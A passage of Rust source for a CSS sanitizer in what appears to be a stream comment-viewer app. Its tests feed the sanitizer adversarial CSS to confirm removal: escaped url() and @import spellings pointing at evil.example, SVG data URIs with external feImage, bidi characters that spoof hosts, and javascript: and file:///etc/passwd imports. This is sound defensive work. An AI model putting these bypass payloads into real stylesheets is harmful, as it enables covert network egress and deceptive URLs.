    /// したがって `stripped_count >= stripped_import_urls.len()` の乖離はここでも広がる。
    /// ⚠ **userinfo 付き URL（`https://a.example@b.example/x`）自体は載る。** 060c 側は
    /// 同意ダイアログにホストを別途強調して出すこと（ここで弾くと正当な URL まで落ちる）。
    fn record_import_url(&mut self, url: &str) {
        if self.stripped_import_urls.len() >= MAX_STRIPPED_IMPORT_URLS {
            return;
        }
        if url.is_empty() || url.chars().count() > MAX_STRIPPED_IMPORT_URL_CHARS {
            return;
        }
        if url.chars().any(is_unsafe_in_import_url) {
            return;
        }
        if !starts_with_http_scheme(url) {
            return;
        }
        self.stripped_import_urls.push(url.to_string());
    }
}

/// 削除区間の**補集合**を書き出す。
///
/// ⚠ 元文字列を切り貼りせず「残す部分だけを写す」形にしてあるので、位置ずれのバグが構造的に起きない。
fn build_output(src: &[char], removals: &[(usize, usize)]) -> String {
    let mut out = String::with_capacity(src.len());
    let mut cursor = 0usize;
    for &(start, end) in removals {
        if start > cursor {
            out.extend(&src[cursor..start.min(src.len())]);
        }
        cursor = cursor.max(end);
    }
    if cursor < src.len() {
        out.extend(&src[cursor..]);
    }
    out
}

/// 出力に**許可形以外の url 位置**が残っていないかを見る（残っていれば違反の種類を返す）。
///
/// ⚠ ブロック構造を一切見ないトークン走査にしてある。主走査の構造解釈がずれても、ここは
/// トークン単位で検出するので「url が漏れる」ではなく「取り込みが拒否される」へ劣化する。
fn find_residual_violation(src: &[char]) -> Option<&'static str> {
    let mut scanner = Scanner::new(src);
    loop {
        let Some(c) = scanner.peek() else {
            return None;
        };
        match c {
            '/' if scanner.peek_at(1) == Some('*') => scanner.skip_comment(),
            '"' | '\'' => {
                scanner.consume_string();
            }
            '@' => {
                scanner.i += 1;
                let (name, _) = scanner.consume_ident();
                match name.to_ascii_lowercase().as_str() {
                    "import" => return Some("@import"),
                    "namespace" => return Some("@namespace"),
                    _ => {}
                }
            }
            // ⚠ 主走査と同じ規則で識別子を切ること（`scan_unit` の同じ箇所の注記を参照）。
            c if c == '\\' || is_ident_char(c) => {
                let before = scanner.i;
                let (name, _) = scanner.consume_ident();
                if scanner.i == before {
                    scanner.i += 1;
                    continue;
                }
                if scanner.peek() != Some('(') {
                    continue;
                }
                let lower = name.to_ascii_lowercase();
                if lower == "url" {
                    scanner.i += 1;
                    let token = scanner.consume_url_value();
                    if !is_allowed_url_value(&token) {
                        return Some("url()");
                    }
                } else if BARE_STRING_URL_FUNCTIONS.contains(&lower.as_str()) {
                    return Some("image-set()/src()");
                }
            }
            _ => scanner.i += 1,
        }
    }
}

#[cfg(test)]
mod tests {
    //! 060b サニタイザの仕様テスト。
    //!
    //! ⚠ **読むだけでは走査型スキャナのバグは見つからない**（060a の厚いレビューの教訓）。
    //! そこで「除去できること」だけでなく **①消しすぎないこと ②迂回が塞がれていること
    //! ③壊れた入力で落ちないこと ④冪等であること** を敵対的入力で常設する。

    use super::*;

    fn run(css: &str) -> SanitizeOutcome {
        match sanitize_css(css) {
            Ok(outcome) => outcome,
            Err(e) => panic!("拒否されるはずのない CSS が拒否された: {e}"),
        }
    }

    /// 出力に外部参照が 1 つも残っていないこと（残留検証を素通しさせない二重の保険）。
    fn assert_clean(outcome: &SanitizeOutcome) {
        let chars: Vec<char> = outcome.css.chars().collect();
        assert_eq!(
            find_residual_violation(&chars),
            None,
            "出力に参照が残っている: {:?}",
            outcome.css
        );
    }

    // --- 依頼者の実サンプル ---------------------------------------------------------------------

    /// ⚠ **依頼者の実サンプル（YouTube 用・逐語）**。
    /// 出典＝`apps/desktop/src/features/comment-viewer/cssCompat.test.ts` の `YOUTUBE_SAMPLE`
    /// （2026-08-04 受領。060a がそこへ逐語で入れたもの）。
    /// ⚠ 意匠の実体は外部 `@import` の中にあり、ここには書体指定と `--txtcolor` しか無い。
    const YOUTUBE_SAMPLE: &str = r#"@import url("https://ruri.info/tool/css/midashi1Comment.css");
yt-live-chat-text-message-renderer #message,
yt-live-chat-text-message-renderer #message * {
font-family: "M PLUS 1p", sans-serif;}
:root{
--txtcolor:#555555;
}
"#;

    /// ⚠ **依頼者の実サンプル（Twitch 用・逐語）**。出典は上と同じ。
    const TWITCH_SAMPLE: &str = r#"@import url("https://ruri.info/tool/css/twmidashi1Comment.css");
.chat-line__no-background{
font-family: "M PLUS 1p", sans-serif;}
:root{
--txtcolor:#555555;
}
"#;

    #[test]
    fn real_youtube_sample_loses_only_its_external_import() {
        let outcome = run(YOUTUBE_SAMPLE);
        // 出力を全文で固定する（変換もフォーマット変更も一切していないことの担保）。
        assert_eq!(
            outcome.css,
            r#"
yt-live-chat-text-message-renderer #message,
yt-live-chat-text-message-renderer #message * {
font-family: "M PLUS 1p", sans-serif;}
:root{
--txtcolor:#555555;
}
"#
        );
        assert_eq!(outcome.stripped_count, 1);
        assert_eq!(
            outcome.stripped_import_urls,
            vec!["https://ruri.info/tool/css/midashi1Comment.css".to_string()]
        );
        assert_clean(&outcome);
    }

    #[test]
    fn real_twitch_sample_loses_only_its_external_import() {
        let outcome = run(TWITCH_SAMPLE);
        assert_eq!(
            outcome.css,
            r#"
.chat-line__no-background{
font-family: "M PLUS 1p", sans-serif;}
:root{
--txtcolor:#555555;
}
"#
        );
        assert_eq!(outcome.stripped_count, 1);
        assert_eq!(
            outcome.stripped_import_urls,
            vec!["https://ruri.info/tool/css/twmidashi1Comment.css".to_string()]
        );
        assert_clean(&outcome);
    }

    #[test]
    fn real_samples_are_idempotent() {
        // 060d は注入のたびに変換を走らせるが、保存側も 2 回通して結果が動かないこと
        //（060c が「取得 CSS ＋ 保存済み CSS」を再度通すため、これは機能要件）。
        for sample in [YOUTUBE_SAMPLE, TWITCH_SAMPLE] {
            let once = run(sample);
            let twice = run(&once.css);
            assert_eq!(twice.css, once.css);
            assert_eq!(twice.stripped_count, 0);
            assert!(twice.stripped_import_urls.is_empty());
        }
    }

    // --- data: は残る（消しすぎない担保）---------------------------------------------------------

    #[test]
    fn data_uris_survive_in_every_value_position() {
        for css in [
            r#".sd-comment-icon{background-image:url("data:image/png;base64,iVBORw0KGgo=")}"#,
            r#"@font-face{src:url(data:font/woff2;base64,d09GMg==) format("woff2")}"#,
            r#".sd-comment{cursor:url('data:image/png;base64,iVBORw0KGgo='),auto}"#,
            r#".sd-comment{list-style-image:url(data:image/gif;base64,R0lGOD)}"#,
            r#".sd-comment{mask-image:url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E")}"#,
            // 大文字の scheme も data: URI（残す側）。
            r#".sd-comment{background:url(DATA:image/png;base64,AAAA)}"#,
            // ⚠ `url(` の内側の空白・改行は CSS 上正当。ここを読み飛ばさない実装にすると
            // 正当な data: URI まで落ちる（ミューテーション 21 が生存したので常設した）。
            ".sd-comment{background:url(\n  \"data:image/png;base64,AAAA\"\n)}",
            ".sd-comment{background:url(  data:image/png;base64,AAAA  )}",
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, css, "data: URI が消えた: {css}");
            assert_eq!(outcome.stripped_count, 0, "data: URI が数えられた: {css}");
        }
    }

    #[test]
    fn css_without_any_reference_is_returned_byte_for_byte() {
        for css in [
            "@charset \"UTF-8\";\n.sd-comment{color:red}",
            "@layer base, theme;\n@layer base{.sd-comment{color:red}}",
            "@supports (display:grid){@media screen{.sd-comment{color:red}}}",
            "@keyframes blink{from{opacity:0}to{opacity:1}}",
            "@container (min-width:100px){.sd-comment{color:red}}",
            "@media screen and (min-width:100px){.sd-comment{color:red}}",
            // 宣言部の文字列とコメントを壊さない（`}` や `url(` を含んでいても）。
            r#".sd-comment::after{content:"} url(https://evil.example/x.png)"}"#,
            r#".sd-comment{/* url(https://evil.example/x.png) */color:red}"#,
            // ⚠ **宣言の途中**のコメント。文の先頭のコメントは `skip_ws_and_comments` が食うので、
            // 「本文ループのコメントスキップを外す」変異はここでしか殺せない（ミューテーション 24）。
            r#".sd-comment{color:/*url(https://evil.example/x.png)*/red}"#,
            r#"@font-face{src:local("X")/*url(https://evil.example/a.woff2)*/}"#,
            // 属性セレクタ内の文字列。
            r#"[data-sd-source="youtube"]{color:red}"#,
            // CSS Nesting。
            ".sd-comment{color:red;& .sd-comment-text{color:blue}}",
            // 波括弧を値に持つカスタムプロパティ。
            ".sd-comment{--foo:{color:red};color:blue}",
            // `url` を含むが関数トークンではないもの。
            ".sd-comment{background:url}\n.xurl(a){color:red}",
            // ⚠⚠ **`</style>` を含む CSS はそのまま保存する**（security.md「CSP方針」060b 節の
            // 「060d への条件」）。`content:"</style>"` は正当な CSS なので除去すると壊れる。
            // ここを「安全のため」落とす変更が入ると、060d 側の「注入は `textContent` で行う」という
            // 不変条件が**不要になったと誤解される**（実際には除去してもエスケープ経路が残る）。
            r#".sd-comment::after{content:"</style><script>x</script>"}"#,
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, css, "無関係な CSS が変わった: {css}");
            assert_eq!(outcome.stripped_count, 0, "無関係な CSS が数えられた: {css}");
        }
    }

    // --- 除去 -----------------------------------------------------------------------------------

    #[test]
    fn every_form_of_import_is_removed() {
        // ⚠ 第 2 要素は「**060c の同意ダイアログに載る宛先**」であって「除去したか」ではない。
        // 除去と計数は全ケースで起きる（`assert_eq!(stripped_count, 1)`）が、載るのは
        // `http(s)` の絶対 URL だけ（理由は `record_import_url` の注記・security-review S-6）。
        for (css, expected_url) in [
            (
                r#"@import url("https://evil.example/a.css");.sd-comment{color:red}"#,
                Some("https://evil.example/a.css"),
            ),
            (
                r#"@import "http://evil.example/a.css";.sd-comment{color:red}"#,
                Some("http://evil.example/a.css"),
            ),
            // プロトコル相対は取得できない（ベース URL が無い）ので載せない。
            (
                r#"@import url(//evil.example/a.css);.sd-comment{color:red}"#,
                None,
            ),
            (r#"@import url(a.css);.sd-comment{color:red}"#, None),
            (
                r#"@import "a.css" screen and (min-width:100px);.sd-comment{color:red}"#,
                None,
            ),
            // ⚠⚠ data: の @import も落とす。入れ子の @import をブラウザが辿るため。
            // ⚠ 宛先としては載せない（060c の取得対象になりえない）。
            (
                r#"@import url("data:text/css,@import url(https://evil.example/b.css)");.sd-comment{color:red}"#,
                None,
            ),
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{color:red}", "@import が残った: {css}");
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css}");
            assert_eq!(
                outcome.stripped_import_urls,
                expected_url.map(str::to_string).into_iter().collect::<Vec<_>>(),
                "@import 先の記録がずれた: {css}"
            );
            assert_clean(&outcome);
        }
    }

    #[test]
    fn namespace_at_rules_are_removed() {
        // 名前空間 URI は取得されないが、残すと「生きた url(http…) が出力にあってよい例外」ができ、
        // 残留検証が条件付きの弱い不変条件に退化する（module doc）。
        let outcome = run("@namespace svg url(http://www.w3.org/2000/svg);\n.sd-comment{color:red}");
        assert_eq!(outcome.css, "\n.sd-comment{color:red}");
        assert_eq!(outcome.stripped_count, 1);
        // @import ではないので同意ダイアログ用の記録には載せない。
        assert!(outcome.stripped_import_urls.is_empty());
        assert_clean(&outcome);
    }

    #[test]
    fn external_and_relative_urls_take_their_whole_declaration_with_them() {
        for value in [
            "https://evil.example/x.png",
            "http://evil.example/x.png",
            "//evil.example/x.png",
            "/x.png",
            "./x.png",
            "x.png",
            "#gradient",
        ] {
            let css = format!(".sd-comment-icon{{color:red;background-image:url({value});border:0}}");
            let outcome = run(&css);
            assert_eq!(
                outcome.css, ".sd-comment-icon{color:red;border:0}",
                "宣言が落ちていない: {value}"
            );
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {value}");
            assert_clean(&outcome);
        }
    }

    #[test]
    fn image_functions_are_removed_even_when_their_contents_look_safe() {
        // ⚠⚠ これが「url() だけを見ていると塞げない経路」への対処。中身は一切見ない。
        for css in [
            r#".sd-comment{background-image:image-set(url("data:image/png;base64,AA") 1x)}"#,
            r#".sd-comment{background-image:-webkit-image-set(url(data:image/png;base64,AA) 1x)}"#,
            r#".sd-comment{background-image:image("data:image/png;base64,AA")}"#,
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{}", "画像系関数が残った: {css}");
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css}");
            assert_clean(&outcome);
        }
    }

    #[test]
    fn a_bare_string_smuggled_through_var_into_image_set_is_removed() {
        // ⚠⚠ 本サニタイザで最も見落としやすい経路（module doc の ⚠⚠）。
        // `--a` はただの文字列で url() でも @import でもないが、image-set() へ置換されると URL になる。
        let outcome = run(
            r#".sd-comment{--a:"https://evil.example/x.png";background-image:image-set(var(--a) 1x);color:red}"#,
        );
        assert_eq!(outcome.css, ".sd-comment{--a:\"https://evil.example/x.png\";color:red}");
        assert_eq!(outcome.stripped_count, 1);
        assert_clean(&outcome);
        // ⚠ 文字列自体は残るが、それを URL 化できる関数がもう存在しないので egress にならない。
        //   （`background-image: var(--a)` は「文字列は <image> ではない」ため無効になるだけ。）
    }

    #[test]
    fn custom_properties_carrying_a_url_are_removed() {
        let outcome = run(".sd-comment{--bg:url(https://evil.example/x.png);color:red}");
        assert_eq!(outcome.css, ".sd-comment{color:red}");
        assert_eq!(outcome.stripped_count, 1);
        assert_clean(&outcome);
    }

    #[test]
    fn urls_nested_inside_at_rule_blocks_are_removed_without_killing_the_block() {
        let outcome =
            run("@media screen{.sd-comment{background:url(https://evil.example/x.png);color:red}}");
        assert_eq!(outcome.css, "@media screen{.sd-comment{color:red}}");
        assert_eq!(outcome.stripped_count, 1);
        assert_clean(&outcome);
    }

    #[test]
    fn font_face_src_is_removed_but_the_block_survives() {
        let outcome = run("@font-face{font-family:X;src:url(https://evil.example/a.woff2)}");
        // ⚠ 文の範囲は「前の `;` の直後から」なので、直前の宣言の `;` は残る（＝無害な空文）。
        // 出力を整形し直さないのは、ユーザーの CSS を必要以上に書き換えないため。
        assert_eq!(outcome.css, "@font-face{font-family:X;}");
        assert_eq!(outcome.stripped_count, 1);
        assert_clean(&outcome);
    }

    #[test]
    fn several_references_in_one_declaration_are_all_counted() {
        let outcome = run(
            ".sd-comment{background:url(https://evil.example/a.png),url(https://evil.example/b.png)}",
        );
        assert_eq!(outcome.css, ".sd-comment{}");
        assert_eq!(outcome.stripped_count, 2);
        assert_clean(&outcome);
    }

    // --- 迂回 -----------------------------------------------------------------------------------

    #[test]
    fn escaped_and_cased_spellings_of_url_are_caught() {
        // ⚠ deny-list を捨てた理由そのもの。識別子はアンエスケープしてから比較している。
        for css in [
            r".sd-comment{background:\75 rl(https://evil.example/x.png)}",
            r".sd-comment{background:u\72 l(https://evil.example/x.png)}",
            r".sd-comment{background:\000075rl(https://evil.example/x.png)}",
            r".sd-comment{background:URL(https://evil.example/x.png)}",
            r".sd-comment{background:Url( 'https://evil.example/x.png' )}",
            ".sd-comment{background:url(\n  \"https://evil.example/x.png\"\n)}",
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{}", "迂回を許した: {css}");
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css}");
            assert_clean(&outcome);
        }
    }

    #[test]
    fn escaped_and_cased_spellings_of_import_are_caught() {
        for css in [
            r#"@\69 mport url("https://evil.example/a.css");.sd-comment{color:red}"#,
            r#"@IMPORT url("https://evil.example/a.css");.sd-comment{color:red}"#,
            r#"@import/**/url("https://evil.example/a.css");.sd-comment{color:red}"#,
            "@import\n\turl(\"https://evil.example/a.css\")\n;.sd-comment{color:red}",
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{color:red}", "迂回を許した: {css}");
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css}");
            assert_clean(&outcome);
        }
    }

    #[test]
    fn escaped_targets_are_removed_but_never_offered_to_the_fetcher() {
        // ⚠ 難読化された URL は「除去して数える」が「060c へ渡す一覧には載せない」。
        for css in [
            r#"@import "\68ttps://evil.example/a.css";.sd-comment{color:red}"#,
            "@import \"htt\\\nps://evil.example/a.css\";.sd-comment{color:red}",
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{color:red}", "迂回を許した: {css}");
            assert_eq!(outcome.stripped_count, 1);
            assert!(
                outcome.stripped_import_urls.is_empty(),
                "難読化された URL を fetcher へ渡そうとしている: {css}"
            );
            assert_clean(&outcome);
        }
    }

    #[test]
    fn a_data_uri_with_a_fragment_is_removed_because_it_can_name_an_svg_resource() {
        // ⚠⚠ security-review の実測で見つかった経路。`data:` を許すのは「SVG を**画像として**読むと
        // secure static mode になり外部参照が仕様上禁止される」ことに依存しているが、
        // `filter:` / `mask:` / `clip-path:` は SVG を**リソース文書**として読むので、その保証が及ばない。
        // リソース参照は対象要素を指すために必ずフラグメントを要するので、`#` を落とせば閉じる。
        for css in [
            r#".sd-comment{filter:url("data:image/svg+xml,<svg><filter id='f'><feImage href='https://evil.example/x'/></filter></svg>#f")}"#,
            r#".sd-comment{mask:url("data:image/svg+xml,<svg><mask id='m'/></svg>#m")}"#,
            r#".sd-comment{clip-path:url("data:image/svg+xml,<svg><clipPath id='c'/></svg>#c")}"#,
            r#".sd-comment{background:url(data:image/png;base64,AA#x)}"#,
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{}", "フラグメント付き data: が残った: {css}");
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css}");
            assert_clean(&outcome);
        }
        // ⚠ フラグメントの無い SVG data URI は**画像として**しか読まれないので残す（消しすぎない担保）。
        let svg_image =
            r#".sd-comment{background-image:url("data:image/svg+xml,<svg><rect fill='red'/></svg>")}"#;
        let outcome = run(svg_image);
        assert_eq!(outcome.css, svg_image);
        assert_eq!(outcome.stripped_count, 0);
    }

    #[test]
    fn an_unquoted_url_token_containing_a_quote_is_treated_as_broken() {
        // ⚠ CSS 仕様上、引用符なし url-token に引用符は現れない（bad-url-token）。ここを普通の文字として
        // 飲み込むと、ブラウザとトークン境界の解釈が分かれる余地が残る。常に「壊れている」側へ倒す。
        for css in [
            r#".sd-comment{background:url(data:image/png;base64,AA")}"#,
            r#".sd-comment{background:url(data:image/png;base64,AA')}"#,
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, ".sd-comment{}", "bad-url が残った: {css}");
            assert_eq!(outcome.stripped_count, 1);
            assert_clean(&outcome);
        }
    }

    #[test]
    fn a_non_ascii_character_in_front_of_url_does_not_hide_it() {
        // ⚠⚠ security-review S-1 の実際の壊れ方。`is_ident_char` が非 ASCII を ident 文字に含めていた
        // ころは、貪欲読みで `<NBSP>url` が 1 つの識別子になり **除去も残留検証もすり抜けていた**
        //（`assert_clean` すら通ってしまう＝このテストが唯一の防波堤）。
        // css-syntax-3 では U+00A0 / U+00D7 / U+2003 / U+2192 は ident code point ではないので、
        // 仕様どおりの実装はここを分割して `url(` を url-token として読む＝ egress。
        for lead in ['\u{A0}', '\u{2003}', '\u{D7}', '\u{2192}'] {
            let css = format!(".sd-comment{{background:{lead}url(https://evil.example/x.png)}}");
            let outcome = run(&css);
            assert_eq!(outcome.css, ".sd-comment{}", "非 ASCII 前置で迂回された: {css:?}");
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css:?}");
            assert_clean(&outcome);
        }
        // at-keyword ごと外れる形（こちらは文が丸ごと残っていた）。
        let outcome = run("@import\u{A0}url(\"https://evil.example/a.css\");.sd-comment{color:red}");
        assert_eq!(outcome.css, ".sd-comment{color:red}");
        assert_eq!(outcome.stripped_count, 1);
        assert_clean(&outcome);
        // 画像系関数側も同じ穴だった。
        let outcome =
            run(".sd-comment{background-image:\u{A0}image-set(\"https://evil.example/x.png\" 1x)}");
        assert_eq!(outcome.css, ".sd-comment{}");
        assert_clean(&outcome);
    }

    #[test]
    fn non_ascii_identifiers_in_ordinary_css_are_not_over_removed() {
        // ⚠ S-1 の修正は「我々が分割してブラウザが結合する」側にしか倒れないが、それでも
        // 日本語のクラス名・カスタムプロパティ・本文を壊さないことを固定する（消しすぎない担保）。
        for css in [
            r#".配信用{color:red;background:url("data:image/png;base64,AA")}"#,
            r#".sd-comment::after{content:"配信中 url(https://evil.example/x.png)"}"#,
            r#"[data-sd-source="youtube"] .配信用 .sd-comment{color:red}"#,
        ] {
            let outcome = run(css);
            assert_eq!(outcome.css, css, "非 ASCII を含む正当な CSS が変わった: {css}");
            assert_eq!(outcome.stripped_count, 0, "無関係な CSS が数えられた: {css}");
        }
        // 非 ASCII のカスタムプロパティに url があれば、その宣言だけが落ちる。
        let outcome = run(".sd-comment{--画像:url(https://evil.example/x.png);color:red}");
        assert_eq!(outcome.css, ".sd-comment{color:red}");
        assert_eq!(outcome.stripped_count, 1);
    }

    #[test]
    fn src_the_var_substitutable_url_function_is_removed_like_image_set() {
        // ⚠⚠ security-review S-2。`src()` は CSS Values 4 の `<url> = <url()> | <src()>` の片割れで、
        // **`var()` 置換可能であることが存在理由**の URL 関数。engine 未実装なだけで、出荷されたら
        // 我々のコードを 1 行も変えずに壁が開く。`image-set()` を落とす理由がそのまま当てはまる。
        for css in [
            r#"@font-face{font-family:X;src:src("https://evil.example/x.woff2")}"#,
            r#".sd-comment{background-image:src("https://evil.example/x.png")}"#,
            r#".sd-comment{background-image:src(var(--u))}"#,
            // 中身が data: でも落とす（image-set と同じ扱い＝中身を見ない）。
            r#".sd-comment{background-image:src("data:image/png;base64,AA")}"#,
        ] {
            let outcome = run(css);
            assert!(
                !outcome.css.contains("src("),
                "src() が残った: {css} -> {:?}",
                outcome.css
            );
            assert_eq!(outcome.stripped_count, 1, "計数がずれた: {css}");
            assert_clean(&outcome);
        }
        // ⚠ `@font-face` の `src:` プロパティ（`(` を伴わない）は誤爆しない。
        let ok = r#"@font-face{font-family:X;src:url(data:font/woff2;base64,d09GMg==) format("woff2")}"#;
        let outcome = run(ok);
        assert_eq!(outcome.css, ok);
        assert_eq!(outcome.stripped_count, 0);
    }

    #[test]
    fn a_prelude_holding_only_an_allowed_data_uri_is_accepted() {
        // ⚠ security-review S-7。判定を `any_url_position` にしていたころは、**外部参照が 1 つも無い**
        // これらが「条件部分に外部参照が…」という事実と違う診断で全拒否されていた。
        // 後者は image-set のサポート検出として実在するイディオム。
        let css = "@supports (background:url(data:image/png;base64,AA)){.sd-comment{color:red}}";
        let outcome = run(css);
        assert_eq!(outcome.css, css, "許可形だけのプレリュードが拒否/改変された");
        assert_eq!(outcome.stripped_count, 0);
        assert_clean(&outcome);

        // ⚠ 画像系関数を含むプレリュードは今も拒否する（中身を見ない規則を曲げないため）。
        // ここを通す判断へ変えるなら、ブロックごと落とすのか残すのかを先に決めること。
        let err = sanitize_css(
            r#"@supports (background-image:-webkit-image-set(url(a.png) 1x)){.sd-comment{color:red}}"#,
        )
        .expect_err("画像系関数のプレリュードは拒否される");
        assert_eq!(err.code, crate::error::ErrorCode::ValidationError);
    }

    #[test]
    fn only_fetchable_http_targets_are_offered_to_the_consent_dialog() {
        // ⚠⚠ security-review S-6。ここに載る文字列は 060c の同意ダイアログにそのまま出る。
        // 取得できない形（相対 / data: / javascript: / file:）と、**表示を偽装できる bidi 文字**は載せない。
        for (css, why) in [
            (r#"@import "javascript:alert(1)";"#, "javascript:"),
            (r#"@import "file:///etc/passwd";"#, "file:"),
            (r#"@import url(a.css);"#, "相対 URL"),
            (
                r#"@import "data:text/css,@import url(https://evil.example/b.css)";"#,
                "data:",
            ),
            (
                "@import \"https://evil.example/\u{202E}gnp.x/a.css\";",
                "bidi override",
            ),
            (
                "@import \"https://evil.example/\u{2066}a\u{2069}.css\";",
                "bidi isolate",
            ),
        ] {
            let outcome = run(css);
            assert!(
                outcome.stripped_import_urls.is_empty(),
                "{why} を fetcher/同意ダイアログへ渡そうとしている: {css}"
            );
            // ⚠ 載せないだけで、除去も計数もしている。
            assert_eq!(outcome.stripped_count, 1, "計数まで落ちた: {css}");
            assert_clean(&outcome);
        }
        // http(s) は載る（大小無視）。
        for (css, expected) in [
            (
                r#"@import "https://ruri.info/a.css";"#,
                "https://ruri.info/a.css",
            ),
            (
                r#"@import url(HTTP://ruri.info/a.css);"#,
                "HTTP://ruri.info/a.css",
            ),
        ] {
            let outcome = run(css);
            assert_eq!(outcome.stripped_import_urls, vec![expected.to_string()], "{css}");
        }
    }

    #[test]
    fn an_escaped_data_uri_is_rejected_rather_than_unescaped() {
        // ⚠ allow-list の要。復元結果が data: でも、エスケープを含む時点で落とす
        //（判定を復元に依存させない＝ deny-list の失敗を繰り返さない）。
        let outcome = run(r".sd-comment{background:url(\64 ata:image/png;base64,AA)}");
        assert_eq!(outcome.css, ".sd-comment{}");
        assert_eq!(outcome.stripped_count, 1);
        assert_clean(&outcome);
    }

    // --- fail-closed --------------------------------------------------------------------------

    #[test]
    fn a_url_in_a_block_at_rule_prelude_is_refused_outright() {
        // ⚠ ミューテーションで分かったこと: この fail-closed を外しても**危険にはならない**
        //（プレリュードは削除対象にならないので url がそのまま出力へ残り、残留検証が拾って拒否する）。
        // ＝ 2 層が本当に冗長になっている珍しい箇所。それでもここを残すのは、
        // **ユーザーに出る文言が変わる**から——「@media などの条件部分に外部参照が…」と言えるのは
        // この経路だけで、残留検証に落ちると「安全に取り除けませんでした」としか言えない。
        // 下の文言の照合は、その診断品質が静かに失われる変更を止めるためにある。
        for css in [
            "@media (min-width:calc(1px + url(https://evil.example/x))){.sd-comment{color:red}}",
            "@supports (background:url(https://evil.example/x)){.sd-comment{color:red}}",
            r#"@media (x:image-set("https://evil.example/x.png" 1x)){.sd-comment{color:red}}"#,
        ] {
            let err = match sanitize_css(css) {
                Ok(_) => panic!("プレリュードの url は拒否されるべき: {css}"),
                Err(e) => e,
            };
            assert_eq!(err.code, crate::error::ErrorCode::ValidationError, "{css}");
            assert!(
                err.message.contains("条件部分"),
                "プレリュード専用の診断文言が失われている（残留検証へ落ちている）: {css} -> {}",
                err.message
            );
        }
    }

    #[test]
    fn deeply_nested_input_is_refused_instead_of_overflowing_the_stack() {
        let css = "a{".repeat(MAX_NESTING_DEPTH + 5);
        let err = sanitize_css(&css).expect_err("深すぎる入れ子は拒否されるべき");
        assert_eq!(err.code, crate::error::ErrorCode::ValidationError);
    }

    #[test]
    fn the_nesting_limit_accepts_the_documented_depth_and_refuses_exactly_one_more() {
        // ⚠ `MAX_NESTING_DEPTH` の doc は「`{` が 64 段までは通り、**65 段目で拒否**」と主張している。
        // 上のテストは MAX+5 なので**境界がずれても落ちない**（`>` を `>=` に変える変異が生存する）。
        // 上限は「スタックオーバーフロー＝ abort を作らない」ための値なので、
        // **緩む方向のずれは安全性に直結する**＝境界そのものを固定する。
        let at_limit = "a{".repeat(MAX_NESTING_DEPTH);
        assert!(
            sanitize_css(&at_limit).is_ok(),
            "上限ちょうど（{MAX_NESTING_DEPTH} 段）が拒否された"
        );
        let over_limit = "a{".repeat(MAX_NESTING_DEPTH + 1);
        assert!(
            sanitize_css(&over_limit).is_err(),
            "上限 +1（{} 段）が通った",
            MAX_NESTING_DEPTH + 1
        );
    }

    #[test]
    fn every_bidi_and_format_character_keeps_a_target_out_of_the_consent_list() {
        // ⚠⚠ security-review S-6。`char::is_control` はこれらを 1 つも弾かない。
        // 060c の同意ダイアログは `stripped_import_urls` を**そのまま表示する**ので、
        // ここを通ると `https://trusted.example/<RLO>…` のように**別ホストに見える文字列**を出せる。
        // 実装は範囲で書いてあるので、**各範囲の両端**を通して穴を作らないことを固定する。
        for bad in [
            '\u{061C}', // ARABIC LETTER MARK
            '\u{200E}', // LRM（範囲の下端）
            '\u{200F}', // RLM（範囲の上端）
            '\u{202A}', // LRE（範囲の下端）
            '\u{202C}', // PDF
            '\u{202E}', // RLO（範囲の上端）
            '\u{2066}', // LRI（範囲の下端）
            '\u{2069}', // PDI（範囲の上端）
        ] {
            let css = format!("@import \"https://evil.example/{bad}a.css\";.sd-comment{{color:red}}");
            let outcome = run(&css);
            assert!(
                outcome.stripped_import_urls.is_empty(),
                "U+{:04X} を含む宛先を同意ダイアログへ渡そうとしている",
                bad as u32
            );
            // ⚠ 載せないだけで、除去も計数もしている（情報は失われていない）。
            assert_eq!(outcome.css, ".sd-comment{color:red}");
            assert_eq!(outcome.stripped_count, 1);
        }
        // 対照: 同じ形で bidi 文字が無ければ載る（常に空になる実装になっていないこと）。
        let outcome = run(r#"@import "https://evil.example/a.css";.sd-comment{color:red}"#);
        assert_eq!(
            outcome.stripped_import_urls,
            vec!["https://evil.example/a.css".to_string()]
        );
    }

    #[test]
    fn the_residual_check_catches_a_hand_crafted_leak() {
        // 主走査が「数えたのに消していない」ときに何が起きるかを、残留検証へ直接入力して固定する。
        for dirty in [
            r#"@import url("https://evil.example/a.css");"#,
            ".sd-comment{background:url(https://evil.example/x.png)}",
            ".sd-comment{background:image-set(url(data:image/png;base64,AA) 1x)}",
            "@namespace svg url(http://www.w3.org/2000/svg);",
        ] {
            let chars: Vec<char> = dirty.chars().collect();
            assert!(
                find_residual_violation(&chars).is_some(),
                "残留検証が漏れを見逃した: {dirty}"
            );
        }
        // 逆に、許可形だけの出力は通ること（残留検証が常に赤くなる実装になっていないこと）。
        let clean: Vec<char> = r#".sd-comment{background:url("data:image/png;base64,AA")}"#
            .chars()
            .collect();
        assert_eq!(find_residual_violation(&clean), None);
    }

    // --- 壊れた入力 -----------------------------------------------------------------------------

    #[test]
    fn adversarial_input_never_panics_or_hangs() {
        let many_closes = "}".repeat(500);
        let deep_but_allowed = "a{".repeat(MAX_NESTING_DEPTH - 1);
        let cases: Vec<&str> = vec![
            "",
            "{",
            "}",
            "@",
            "@;",
            "@import",
            "@import url(",
            r#"@import "unterminated"#,
            ".a{background:url(",
            ".a{background:url(https://evil.example/x",
            ".a{content:\"unterminated",
            ".a{/* unterminated",
            ".a{background:url(https://evil.example/x\\",
            &many_closes,
            "\u{0}\u{1}\u{7F}",
            "\u{FEFF}.a{color:red}",
            ".a{--x:(;)}",
            "a[b='c'{d:e}",
